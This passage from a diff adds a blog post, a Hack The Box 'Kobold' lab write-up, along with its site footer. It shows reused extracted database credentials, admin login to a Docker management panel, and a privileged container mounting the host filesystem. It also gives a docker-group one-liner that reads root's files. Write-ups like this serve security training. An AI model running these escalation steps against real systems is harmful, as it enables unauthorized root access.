&quot;ComplexP@sswordAdmin1928&quot;</span><br><span class="line">opt[12] = true   ; PDO::ATTR_PERSISTENT</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+
+<p>There we go, we’ve got a set of MySQL credentials for PrivateBin:</p>
+<ul>
+<li><strong>Username:</strong> <code>privatebin</code></li>
+<li><strong>Password:</strong> <code>ComplexP@sswordAdmin1928</code></li>
+</ul>
+<h3 id="Privilege-Escalation-—-Arcane-Docker-Management"><a href="#Privilege-Escalation-—-Arcane-Docker-Management" class="headerlink" title="Privilege Escalation — Arcane Docker Management"></a>Privilege Escalation — Arcane Docker Management</h3><h4 id="Accessing-Arcane"><a href="#Accessing-Arcane" class="headerlink" title="Accessing Arcane"></a>Accessing Arcane</h4><p>Remember that Go application sitting on port 3552? That’s <strong>Arcane</strong>, a Docker container management web UI. Password reuse is always worth a shot, so let’s try the extracted password with the username <code>arcane</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Credentials: arcane / ComplexP@sswordAdmin1928</span><br></pre></td></tr></table></figure></div>
+
+<p>The login succeeds, and we’re now sitting inside the Arcane Docker management panel with admin access.</p>
+<h4 id="Creating-a-Privileged-Container"><a href="#Creating-a-Privileged-Container" class="headerlink" title="Creating a Privileged Container"></a>Creating a Privileged Container</h4><p>From the Arcane admin interface, we can create a brand new container with the following settings:</p>
+<ul>
+<li><strong>Image:</strong> <code>privatebin/nginx-fpm-alpine:2.0.2</code> (already available locally)</li>
+<li><strong>User:</strong> <code>root</code></li>
+<li><strong>Privileged:</strong> Enabled</li>
+<li><strong>TTY:</strong> Enabled</li>
+<li><strong>Volume mount:</strong> <code>/</code> (host) → <code>/hostfs</code> (container)</li>
+</ul>
+<p>This mounts the entire host filesystem into our container. Since the container runs as root with privileged access, we effectively get read and write access to any file on the host.</p>
+<h4 id="Root-Access"><a href="#Root-Access" class="headerlink" title="Root Access"></a>Root Access</h4><p>After creating and starting the container, we connect to its console and <code>chroot</code> into the mounted host filesystem to become root on the box itself:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ # whoami</span><br><span class="line">root</span><br><span class="line">/ # chroot /hostfs /bin/bash</span><br><span class="line">root@kobold:/# cat /root/root.txt</span><br><span class="line">d2f8b37e6a3e4c422c9e5aa0b1860187</span><br></pre></td></tr></table></figure></div>
+
+<p>Alternatively, if we notice the docker group access early on, this whole thing can be collapsed into a one-liner straight from <code>ben</code>‘s shell:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ben@kobold:~$ sg docker -c &quot;docker run --rm -v /:/hostfs --user root --entrypoint /bin/sh privatebin/nginx-fpm-alpine:2.0.2 -c &#x27;cat /hostfs/root/root.txt&#x27;&quot;</span><br><span class="line">d2f8b37e6a3e4c422c9e5aa0b1860187</span><br></pre></td></tr></table></figure></div>
+
+<p>Either way, we grab the root flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2f8b37e6a3e4c422c9e5aa0b1860187</span><br></pre></td></tr></table></figure></div>
+
+<p>Hope you liked this writeup!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Kobold</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-08-06 18:56:02</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-08-06 18:59:26
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/08/06/Hackthebox-Kobold/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/07/30/Hackthebox-Fries/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Fries</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Kobold</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Foothold-%E2%80%94-CVE-2026-23744-MCPJam-Inspector-RCE"><span class="nav-text">Foothold — CVE-2026-23744 (MCPJam Inspector RCE)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lateral-Movement-%E2%80%94-CVE-2025-49596-PrivateBin-LFI"><span class="nav-text">Lateral Movement — CVE-2025-49596 (PrivateBin LFI)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-%E2%80%94-Arcane-Docker-Management"><span class="nav-text">Privilege Escalation — Arcane Docker Management</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
